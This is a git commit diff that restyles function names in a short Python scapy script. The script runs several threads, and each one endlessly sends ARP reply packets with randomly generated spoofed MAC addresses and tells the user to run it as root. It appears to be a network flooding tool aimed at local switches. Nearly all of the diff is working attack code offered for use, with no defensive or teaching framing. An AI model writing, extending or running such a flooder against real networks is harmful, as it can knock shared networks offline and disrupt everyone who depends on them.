e6789af2630c2372e185a316a4fb4ee7b76bf2bd
K1llf0rce <fteppan@protonmail.com>
2022-02-21 14:32:23 +0100

    pretty code

--- main.py
+++ main.py
@@ -15,17 +15,17 @@ args = parser.parse_args()
 def send_packet():
     count = 0
     while True:
-        sendp(Ether(src=RandMAC(),dst=getRandomMAC())/ARP(op=2, psrc="0.0.0.0", hwdst=getRandomMAC())/Padding(load="X"*18), verbose=0)
+        sendp(Ether(src=get_random_MAC(),dst=get_random_MAC())/ARP(op=2, psrc="0.0.0.0", hwdst=get_random_MAC())/Padding(load="X"*18), verbose=0)
         count = count + 1
         print(f"Sent packet: {count}")
 
 # generate random MAC
-def getRandomMAC():
+def get_random_MAC():
     genMAC = f"{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}"
     return genMAC
 
 # start threads
-def startThreads():
+def start_threads():
     threads = int(args.threads)
     print(f"Using thread count of: {threads}")
     for i in range(1,threads):
@@ -33,6 +33,7 @@ def startThreads():
         t.start()
 
 # start here
-print("RUN AS ROOT!")
-sleep(1)
-startThreads()
+if __name__ == "__main__":
+    print("RUN AS ROOT!")
+    sleep(1)
+    start_threads()
